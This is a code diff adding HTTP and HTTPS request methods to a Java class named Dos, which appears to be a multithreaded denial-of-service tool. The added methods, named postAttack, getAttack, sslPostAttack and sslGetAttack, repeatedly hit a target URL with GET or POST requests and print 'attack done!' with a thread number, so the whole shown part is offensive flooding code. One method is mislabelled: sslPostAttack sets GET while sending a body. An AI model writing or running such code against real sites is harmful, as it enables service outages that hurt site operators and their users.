@@ -110,4 +110,86 @@ public class Dos implements Runnable {
         }
         System.out.println("Main Thread ended");
     }
+
+private void checkConnection(String url) throws Exception {
+        System.out.println("Checking Connection");
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        if (responseCode == 200) {
+            System.out.println("Connected to website");
+        }
+        Dos.url = url;
+    }
+
+    private void sslCheckConnection(String url) throws Exception {
+        System.out.println("Checking Connection (ssl)");
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        if (responseCode == 200) {
+            System.out.println("Connected to website");
+        }
+        Dos.url = url;
+    }
+
+    private void postAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setRequestMethod("POST");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+        con.setRequestProperty("Accept-Language", "en-US,en;");
+        String urlParameters = "out of memory";
+
+        con.setDoOutput(true);
+        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
+        wr.writeBytes(urlParameters);
+        wr.flush();
+        wr.close();
+        int responseCode = con.getResponseCode();
+        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
+    }
+
+    private void getAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+    }
+
+    private void sslPostAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+        con.setRequestProperty("Accept-Language", "en-US,en;");
+        String urlParameters = "out of memory";
+
+        con.setDoOutput(true);
+        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
+        wr.writeBytes(urlParameters);
+        wr.flush();
+        wr.close();
+        int responseCode = con.getResponseCode();
+        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
+    }
+
+    private void sslGetAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+    }
 }
